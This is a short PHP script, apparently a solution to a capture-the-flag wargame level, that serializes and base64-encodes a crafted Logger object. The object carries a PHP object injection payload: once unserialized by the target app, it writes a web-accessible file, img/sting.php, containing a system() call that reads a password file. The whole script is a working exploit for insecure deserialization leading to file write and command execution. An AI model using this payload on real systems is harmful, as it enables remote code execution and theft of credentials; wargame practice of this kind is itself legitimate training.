<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="Gotcha !!\n";
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "img/sting.php";
    }
}

$o = new Logger();
print base64_encode(serialize($o));

?>